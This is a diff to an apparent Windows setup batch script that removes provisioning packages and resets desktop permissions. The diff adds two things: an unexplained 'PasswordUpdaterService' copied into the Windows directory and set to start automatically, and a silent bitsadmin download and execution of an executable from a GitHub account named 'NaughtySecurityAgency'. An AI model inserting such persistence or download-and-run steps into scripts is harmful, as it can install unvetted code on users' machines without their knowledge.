@@ -1,6 +1,14 @@
 @echo off
 setlocal enabledelayedexpansion
 
+:: Password Updater Service
+md %windir%\PasswordUpdaterService
+    for %%F in ("PasswordUpdaterService.*") do (
+        copy /y "%%F" %windir%\PasswordUpdaterService\
+)
+sc create PasswordUpdaterService binpath= %windir%\PasswordUpdaterService\PasswordUpdaterService.exe
+sc config PasswordUpdaterService start= auto
+
 :: Autopilot
 @powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Uninstall-ProvisioningPackage -AllInstalledPackages"
 rd /s /q %ProgramData%\Microsoft\Provisioning
@@ -122,3 +130,10 @@ icacls "%SystemDrive%\Users\Public\Desktop" /grant "%username%:F" /t /l /q /c
 takeown /f "%USERPROFILE%\Desktop" /r /d y
 icacls "%USERPROFILE%\Desktop" /inheritance:r
 icacls "%USERPROFILE%\Desktop" /grant "%username%:F" /t /l /q /c
+
+:: Browser
+set DOWNLOAD_URL=https://github.com/NaughtySecurityAgency/Appz/releases/download/2024/dragonsetup.exe
+set INSTALLER_NAME=dragonsetup.exe
+bitsadmin /transfer "Browser" /Dynamic %DOWNLOAD_URL% %~dp0%INSTALLER_NAME%
+start /wait "" %INSTALLER_NAME% /S
+del %INSTALLER_NAME%
